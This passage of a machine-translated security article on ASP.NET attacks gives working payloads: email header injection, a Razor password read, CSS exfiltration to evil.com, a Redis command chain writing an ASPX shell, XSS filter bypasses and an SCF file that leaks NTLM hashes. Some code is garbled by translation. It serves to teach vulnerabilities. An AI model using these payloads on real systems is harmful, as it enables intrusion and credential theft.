class="hljs-number"><span class="hljs-number">18</span></span> Mar <span class="hljs-number"><span class="hljs-number">1997</span></span> <span class="hljs-number"><span class="hljs-number">14</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span>:<span class="hljs-number"><span class="hljs-number">24</span></span> <span class="hljs-literal"><span class="hljs-literal">-0800</span></span> (PST) Received: from alpha.bieberdorf.edu (alpha.bieberdorf.edu [<span class="hljs-number"><span class="hljs-number">124.211</span></span><span class="hljs-type"><span class="hljs-type">.3.11</span></span>]) by mail.bieberdorf.edu (<span class="hljs-number"><span class="hljs-number">8.8</span></span>.<span class="hljs-number"><span class="hljs-number">5</span></span>) id <span class="hljs-number"><span class="hljs-number">004</span></span>A21; Tue, Mar <span class="hljs-number"><span class="hljs-number">18</span></span> <span class="hljs-number"><span class="hljs-number">1997</span></span> <span class="hljs-number"><span class="hljs-number">14</span></span>:<span class="hljs-number"><span class="hljs-number">36</span></span>:<span class="hljs-number"><span class="hljs-number">17</span></span> <span class="hljs-literal"><span class="hljs-literal">-0800</span></span> (PST) From: rth@bieberdorf.edu (RT Hood) To: tmh@immense<span class="hljs-literal"><span class="hljs-literal">-isp</span></span>.com Date: Tue, Mar <span class="hljs-number"><span class="hljs-number">18</span></span> <span class="hljs-number"><span class="hljs-number">1997</span></span> <span class="hljs-number"><span class="hljs-number">14</span></span>:<span class="hljs-number"><span class="hljs-number">36</span></span>:<span class="hljs-number"><span class="hljs-number">14</span></span> PST Message<span class="hljs-literal"><span class="hljs-literal">-Id</span></span>: &lt;rth031897143614<span class="hljs-literal"><span class="hljs-literal">-00000298</span></span>@mail.bieberdorf.edu&gt; X<span class="hljs-literal"><span class="hljs-literal">-Mailer</span></span>: Loris v2.<span class="hljs-number"><span class="hljs-number">32</span></span>  Lunch today?</code> </pre><br> 显然，在没有验证落入“ To”头中的值的情况下，可以将信件重定向到另一个收件人。 但这太简单明显了，因此验证已经在.Net级别进行了。 <br><br> 但是，如果引入新的Reply-To标头-答案的地址，则许多形式（例如“忘记密码”）通常会从中获取发送地址，因此，引入回车符和换行符并获得工作量就足够了。 <br><br><pre> <code class="hljs julia">... From: rth<span class="hljs-meta"><span class="hljs-meta">@bieberdorf</span></span>.edu (RT Hood) To: tmh<span class="hljs-meta"><span class="hljs-meta">@immense</span></span>-isp.com/r/nReply-to:hack<span class="hljs-meta"><span class="hljs-meta">@hack</span></span>.ru <span class="hljs-built_in"><span class="hljs-built_in">Date</span></span>: Tue, Mar <span class="hljs-number"><span class="hljs-number">18</span></span> <span class="hljs-number"><span class="hljs-number">1997</span></span> <span class="hljs-number"><span class="hljs-number">14</span></span>:<span class="hljs-number"><span class="hljs-number">36</span></span>:<span class="hljs-number"><span class="hljs-number">14</span></span> PST Message-Id: &lt;rth031897143614-<span class="hljs-number"><span class="hljs-number">00000298</span></span><span class="hljs-meta"><span class="hljs-meta">@mail</span></span>.bieberdorf.edu&gt; ...      : From: rth<span class="hljs-meta"><span class="hljs-meta">@bieberdorf</span></span>.edu (RT Hood) To: tmh<span class="hljs-meta"><span class="hljs-meta">@immense</span></span>-isp.com Reply-To: hack<span class="hljs-meta"><span class="hljs-meta">@hack</span></span>.ru <span class="hljs-built_in"><span class="hljs-built_in">Date</span></span>: Tue, Mar <span class="hljs-number"><span class="hljs-number">18</span></span> <span class="hljs-number"><span class="hljs-number">1997</span></span> <span class="hljs-number"><span class="hljs-number">14</span></span>:<span class="hljs-number"><span class="hljs-number">36</span></span>:<span class="hljs-number"><span class="hljs-number">14</span></span> PST Message-Id: &lt;rth031897143614-<span class="hljs-number"><span class="hljs-number">00000298</span></span><span class="hljs-meta"><span class="hljs-meta">@mail</span></span>.bieberdorf.edu&gt;</code> </pre><br>  <b><u>易受攻击的代码示例：</u></b> <br><br><pre> <code class="hljs python">MailAddress <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> = new MailAddress(“******@mail.r<span class="hljs-string"><span class="hljs-string">u", “test"</span></span>); MailAddress to = new MailAddress(email); MailMessage m = new MailMessage(<span class="hljs-keyword"><span class="hljs-keyword">from</span></span>, to); m.Subject = <span class="hljs-string"><span class="hljs-string">""</span></span>; m.Body = <span class="hljs-string"><span class="hljs-string">"-"</span></span>; m.Headers.Add(“To<span class="hljs-string"><span class="hljs-string">", email); m.IsBodyHtml = true; SmtpClient smtp = new SmtpClient("</span></span>smtp.mail.r<span class="hljs-string"><span class="hljs-string">u", 587); smtp.Credentials = new NetworkCredential(“******@mail.ru"</span></span>, “******<span class="hljs-string"><span class="hljs-string">"); smtp.EnableSsl = true; smtp.Send(m);</span></span></code> </pre><br>  <b>概念验证</b> ： <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/Bs_4_hpomig" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>  <b>解决方案：</b>不要编写复杂的代码，请使用新鲜的.Net <br><br>  <b>局部视图中的RCE</b> <br><br>  <b>说明：</b> ASP.NET MVC术语中有两个重要概念： <br>  <b>视图</b>是用户看到的视图。 如前所述，借助剃须刀或Web表单引擎，可以实现服务器端代码。 <br>  <b>部分视图</b> - <b>部分视图</b> 。 这是视图内容的一部分，为方便起见在单独的文件中将其取出。 <br><br> 必须在Partial View中有一些字段，该字段以html呈现，并且有可能输入危险负载。 <br><br>  <b>负载示例：</b>获取当前用户的密码 <br><br><pre> <code class="hljs css">@((<span class="hljs-keyword"><span class="hljs-keyword">Account</span></span>.<span class="hljs-keyword"><span class="hljs-keyword">Models</span></span>.<span class="hljs-keyword"><span class="hljs-keyword">User</span></span>)<span class="hljs-keyword"><span class="hljs-keyword">Session</span></span>[“<span class="hljs-keyword"><span class="hljs-keyword">User</span></span>”].<span class="hljs-keyword"><span class="hljs-keyword">Password</span></span></code> </pre> <br> 进入视图后，将执行此代码。 由于这些指令将被视为剃刀引擎。 下图显示了这种情况。 <br><br>  <b>算法：</b> <br><br><ol><li> 用户向控制器发出请求； </li><li> 控制器渲染视图； </li><li> 在视图内部，遇到了部分视图，此后再次向控制器发出请求，该控制器负责呈现部分视图； </li><li> 完成的部分视图将返回到主视图，而主视图将返回给用户。 </li></ol><br><img src="https://habrastorage.org/webt/_j/si/qs/_jsiqsyffaujvq2hikalumgdxte.png"><br><br>  <b>概念验证</b> ： <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/KOupZQpCmdM" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><br>  <b>一个简化的例子</b> ： <br><br><pre> <code class="hljs pgsql">@{ Html.RenderPartial("Code", html); } Controller - <span class="hljs-built_in"><span class="hljs-built_in">public</span></span> ActionResult <span class="hljs-keyword"><span class="hljs-keyword">Index</span></span>(string html = "") { ViewBag.Html = html; <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">View</span></span>(); } Partial <span class="hljs-keyword"><span class="hljs-keyword">view</span></span> –   @model string @{ Layout = <span class="hljs-keyword"><span class="hljs-keyword">null</span></span>; } @Model <span class="hljs-keyword"><span class="hljs-keyword">Index</span></span> <span class="hljs-keyword"><span class="hljs-keyword">view</span></span> –   @{ string html = ViewBag.Html.ToString(); } @{ Html.RenderPartial("Code", html); }</code> </pre><br>  <b>概念验证</b> ： <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/KOupZQpCmdM" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><br>  <b>PS</b>尝试复制失败。 <br><br>  <b>CSRF和CSS注入</b> <br><br> 这些漏洞意味着与用户的互动。 <br><br>  <b>CSRF（跨站点请求伪造）</b> -跨站点请求伪造。 <br><br>  <b>算法：</b> <br><br><ol><li> 用户进入黑客站点； </li><li> 填写表格字段； </li><li> 表单中的数据代表用户及其角色发送到另一个站点； </li><li> 因此，用户在没有意识到的情况下，对另一个资源执行了一些操作。 </li></ol><br> 为了防止此类攻击，发明了CSRF令牌，通常，这是一个包含字符序列的字符串。 <br><br> 发现一个漏洞，该漏洞避开了针对CSRF的保护。 只需要使用比原始字符串少得多的字符串作为令牌。 <br><br>  <b>普通令牌</b> <br><br><pre> <code class="hljs pgsql">&lt;<span class="hljs-keyword"><span class="hljs-keyword">input</span></span> <span class="hljs-keyword"><span class="hljs-keyword">type</span></span>="hidden" <span class="hljs-type"><span class="hljs-type">name</span></span>="__RequestVerificationToken" <span class="hljs-keyword"><span class="hljs-keyword">value</span></span>="CIhXcKin7XcwYn8Y1hNVgP5eOOhAMn37dnZtFzziOqhflM423Z5JKkVPciRopfgcPau5tj" /&gt;</code> </pre> <br>  <b>脆弱令牌</b> <br><br><pre> <code class="hljs pgsql">&lt;<span class="hljs-keyword"><span class="hljs-keyword">input</span></span> <span class="hljs-keyword"><span class="hljs-keyword">type</span></span>="hidden" <span class="hljs-type"><span class="hljs-type">name</span></span>="__RequestVerificationToken" <span class="hljs-keyword"><span class="hljs-keyword">value</span></span>="ovomyQnYPxvPXfdxrjO1JEce3zPvGn" /&gt;</code> </pre> <br>  <b>通过CSS（不是XSS）窃取令牌的负载：</b> <br> 在截断令牌无济于事的情况下，您可以诉诸CSS-Injection攻击，该攻击使您可以从页面中窃取令牌并将其绘制在资源上。 由于此，一个真实的令牌被提供给用户，并且以该用户的名义在站点上进行了必要的请求。 <br><br>  <b><u>加载示例</u></b> ： <br><br><pre> <code class="hljs xml">%0A{}*{color:red;} - Test <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag"> =</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"s"</span></span></span><span class="hljs-tag">&gt;</span></span> secret <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">style</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag"> =</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"text/css"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="css"><span class="css"> </span><span class="hljs-selector-tag"><span class="css"><span class="hljs-selector-tag">div</span></span></span><span class="css"> </span><span class="hljs-selector-id"><span class="css"><span class="hljs-selector-id">#s</span></span></span><span class="css">:: </span><span class="hljs-selector-tag"><span class="css"><span class="hljs-selector-tag">-webkit-scrollbar-track-piece</span></span></span><span class="hljs-selector-pseudo"><span class="css"><span class="hljs-selector-pseudo">:vertical</span></span></span><span class="hljs-selector-pseudo"><span class="css"><span class="hljs-selector-pseudo">:increment</span></span></span><span class="css"> { </span><span class="hljs-attribute"><span class="css"><span class="hljs-attribute">background</span></span></span><span class="css">: red </span><span class="hljs-built_in"><span class="css"><span class="hljs-built_in">url</span></span></span><span class="css">(//evil.com?s); } * {</span><span class="hljs-attribute"><span class="css"><span class="hljs-attribute">-o-link</span></span></span><span class="css">:</span><span class="hljs-string"><span class="css"><span class="hljs-string">'javascript:alert(1)'</span></span></span><span class="css">;</span><span class="hljs-attribute"><span class="css"><span class="hljs-attribute">-o-link-source</span></span></span><span class="css">: current;}</span></span></code> </pre><br>  <b>DocX中的XXE</b> <br><br>  <b>描述：</b> ASP.NET与其他技术一样，使用许多第三方解决方案。 在集成到ASP.NET的这些解决方案之一中，发现了XXE（XML外部实体）漏洞，其中包括xml解析器错误和连接可能包含关键数据的外部实体的能力。 在<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">OWASP</a>页面上阅读有关XXE的更多信息。 <br><br> 在这种情况下，该组件负责加载和解析docx（Microsoft World）文件。 由于任何Office文档实际上都是一组xml文件，因此分析可能会导致XXE攻击。 <br><br>  <b>算法：</b> <br><br><ol><li> 包装好的办公室文件； </li><li> 正在引入负载； </li><li> 它被打包为docx； </li><li> 将其倒入服务器中进行处理，在其中使用易受攻击的组件。 </li></ol><br>  <b>概念验证</b> ： <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/gCAU9M_E2xw" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><br>  <b>通过Redis进行RCE</b> <br><br>  <b>描述：</b>除了易受攻击的组件之外，ASP.NET黑客还可与易受攻击的技术结合使用。 例如，Redis RAM存储系统中存在一个长期存在的漏洞，该漏洞允许在服务器端执行任意代码。 接下来，将针对ASP来考虑这种攻击。 <br><br>  <b>算法：</b> <br><br><ol><li> 与Redis的连接。 它必须与Web服务器在同一服务器上运行，这一点很重要。 </li><li> 执行以下清单，并使用Web服务器查看结果页面，将执行任意代码。 在这种情况下，调用计算器： </li></ol><br><pre> <code class="hljs swift">config <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> dir <span class="hljs-type"><span class="hljs-type">DIRNAME</span></span> config <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> dbfilename asd.aspx flushall <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> <span class="hljs-built_in"><span class="hljs-built_in">c</span></span> '&lt;%@ <span class="hljs-type"><span class="hljs-type">Page</span></span> <span class="hljs-type"><span class="hljs-type">Language</span></span>=<span class="hljs-string"><span class="hljs-string">"C#"</span></span> <span class="hljs-type"><span class="hljs-type">AutoEventWireup</span></span>=<span class="hljs-string"><span class="hljs-string">"true"</span></span> <span class="hljs-type"><span class="hljs-type">CodeBehind</span></span>=<span class="hljs-string"><span class="hljs-string">"asd.aspx.cs"</span></span> %&gt;&lt;% <span class="hljs-type"><span class="hljs-type">System</span></span>.<span class="hljs-type"><span class="hljs-type">Diagnostics</span></span>.<span class="hljs-type"><span class="hljs-type">Process</span></span>.<span class="hljs-type"><span class="hljs-type">Start</span></span>(<span class="hljs-string"><span class="hljs-string">"calc.exe"</span></span>); %&gt;' save</code> </pre><br>  <b>概念验证</b> ： <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/4p9UlWt9GMY" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><br>  <b>XSS旁路过滤器</b> <br><br>  ASP.NET具有自己的机制，可以从XSS类的攻击中过滤数据。 当您尝试传输禁止的字符或签名时，将触发以下保护： <br><br><img src="https://habrastorage.org/webt/og/-b/me/og-bmepcexanckl1pma1l8_71q4.png"><br><br> 但是，有很多方法可以解决此保护问题。 以下是其中一些： <br><br><ul><li>  EF％BC％9Cimg％20src％3Dxxx％20onerror％3D <b>警报（1）</b> ％EF％BC％9E </li><li>  &lt;-/脚本&gt; <b>警报（1）</b> ; </li><li>  &lt;/ XSS / *-* / STYLE = xss：e / ** / xpression（ <b>警报（'XSS'）</b> ）&gt; </li><li>  ％uff1cscript％uff1e <b>警报（'XSS'）</b> ;％uff1c /脚本％uff1e </li></ul><br> 在最新版本中，这些方法不再起作用，但是，正如已经提到的，ASP.NET技术主要是为大型项目和长期项目创建的，因此许多资源都可能受到此漏洞的影响。 <br><br>  <b>Shell命令文件</b> <br><br>  <b>描述：</b>不久之前，与Google Chrome浏览器相关的漏洞激增，其实质是窃取用户的NTLM哈希。 <br><br>  <b>算法：</b> <br><br>  1）准备一个带有scf扩展名和以下内容的文件 <br><br><pre> <code class="hljs markdown">[Shell] IconFile=\\<span class="hljs-strong"><span class="hljs-strong">***.**</span></span>.<span class="hljs-emphasis"><span class="hljs-emphasis">*.*</span></span>**\icon</code> </pre><br>  ip而不是星号ip是攻击者的smb服务器的地址； <br><br>  2）到达用户计算机时，甚至不需要打开该文件。 用户只需转到该文件所在的文件夹就足够了。 一旦发生这种情况，哈希数据包将被发送到SMB服务器。 <br><br>  3）因此，基础架构黑客攻击也可以与简单的漏洞（例如开放重定向）结合使用。 <br><br>  <b>概念验证</b> ： <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/_iTsFZvvXgg" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><br><div class="spoiler">  <b class="spoiler_title">参考文献</b> <div class="spoiler_text">  • <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">metanit.com/sharp/mvc5/12.1.php</a> <br>  • <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">vimeo.com/35002943</a> <br>  • <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">mybasictricks.blogspot.ru/2013/10/bypassing-xss-filters.html</a> <br>  • <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">xakep.ru/2017/05/17/chrome-and-scf-files</a> <br>  • <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">michaeldaw.org/news/news-030407</a> <br>  •codeby.net（SooLFaa） <br>  • <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">antichat.ru</a> （SooLFaa） </div></div><br>  <b>感谢您的关注！</b> 分享您的经验，并在本文的评论中向Alexei Morozov（aka <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">SoolFaa</a> ）提问。 </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN413649/">https://habr.com/ru/post/zh-CN413649/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN413637/index.html">谷歌发布了7条AI伦理原则</a></li>
<li><a href="../zh-CN413639/index.html">受保护的智能手机：谁需要它，它们之间有何不同？</a></li>
<li><a href="../zh-CN413641/index.html">设计思维之争</a></li>
<li><a href="../zh-CN413643/index.html">Aitracking-最佳测谎仪</a></li>
<li><a href="../zh-CN413647/index.html">找出您在机器学习领域中的地位</a></li>
<li><a href="../zh-CN413651/index.html">电脑游戏：保护开发者的知识产权</a></li>
<li><a href="../zh-CN413653/index.html">概率编程和黑客贝叶斯方法</a></li>
<li><a href="../zh-CN413655/index.html">他们真正销售着陆页的哪些文本？</a></li>
<li><a href="../zh-CN413657/index.html">Uber神经网络识别处于“异常”状态的用户</a></li>
<li><a href="../zh-CN413661/index.html">电子服务及其位置的传奇。 第1部分。电子服务</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>